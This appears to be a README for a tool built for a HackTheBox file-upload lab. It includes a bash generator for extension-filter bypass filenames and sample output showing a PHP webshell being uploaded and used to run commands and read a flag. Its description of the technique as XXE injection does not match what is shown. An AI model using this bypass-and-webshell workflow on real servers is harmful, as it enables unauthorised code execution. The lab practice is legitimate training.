# xxec
A command-line tool for exploiting XXE injection via file uploads

I built this tool to automate XXE injection for the **HackTheBox - File Upload Attacks** module. 

The script fuzzes for file extensions that have code execution, uploads a webshell and then allows the user to issue commands directly from the command line. 

## Arguments

- `-H`: Host (IP of the server)
- `-p`: Port (Port on which the web application is running)
- `-w`: Wordlist (Wordlist containing extensions to fuzz, items in the wordlist must be of the form `.ext`)
- `-c`: Check Directory (Directory where uploaded files are placed, you should omit the first `/` from the path as the script handles it automatically as shown in usage example below)

## Wordlist Generation

If you are coming here from the **File Upload Attacks - Skills Assessment** on **HTB**, you should make use of the wordlist generator provided within the module. 

Adjusted for the tool:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phar' '.phtml'; do
        echo "$char$ext.svg" >> extensions-svg.txt
        echo "$ext$char.svg" >> extensions-svg.txt
        echo "svg$char$ext"  >> extensions-svg.txt
        echo "svg$ext$char"  >> extensions-svg.txt
    done
done
```

## Usage

```shell
python3 xxec.py -H SERVER -p PORT -w extensions-svg.txt -c 'path/to/directory/'

[TEST 1/36] Trying extension: ..php.svg
[UPLOAD SUCCESS] test..php.svg -> Checking execution...
Check URL: http://SERVER:PORT/path/to/directory/test..php.svg
Response Status: 404

[TEST 2/36] Trying extension: .php..svg
[UPLOAD SUCCESS] test.php..svg -> Checking execution...
Check URL: http://SERVER:PORT/path/to/directory/test.php..svg
Response Status: 404

[TEST 3/36] Trying extension: .svg..php
[UPLOAD SUCCESS] test.svg..php -> Checking execution...
Check URL: http://SERVER:PORT/path/to/directory/test.svg..php
Response Status: 404

[TEST 4/36] Trying extension: ..phps.svg
[UPLOAD SUCCESS] test..phps.svg -> Checking execution...
Check URL: http://SERVER:PORT/path/to/directory/test..phps.svg
Response Status: 404

[TEST 5/36] Trying extension: .phps..svg
[UPLOAD SUCCESS] test.phps..svg -> Checking execution...
Check URL: http://SERVER:PORT/path/to/directory/test.phps..svg
Response Status: 404

[TEST 6/36] Trying extension: .svg..phps
[UPLOAD SUCCESS] test.svg..phps -> Checking execution...
Check URL: http://SERVER:PORT/path/to/directory/test.svg..phps
Response Status: 403

[TEST 7/36] Trying extension: ..phar.svg
[UPLOAD SUCCESS] test..phar.svg -> Checking execution...
Check URL: http://SERVER:PORT/path/to/directory/test..phar.svg
[CODE EXECUTION] SUCCESS: http://SERVER:PORT/path/to/directory/test..phar.svg

[!] Detected execution. Deploy attack payload? (y/n): y
[UPLOAD SUCCESS] shell..phar.svg -> Checking execution...
[+] Webshell uploaded: http://SERVER:PORT/path/to/directory/shell..phar.svg
Enter command to execute (or type 'exit' to stop): ls /
[COMMAND OUTPUT]

bin
boot
dev
etc
flag_xx.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
Enter command to execute (or type 'exit' to stop): cat /flag_xx.txt
[COMMAND OUTPUT]

HTB{}
Enter command to execute (or type 'exit' to stop): 
```
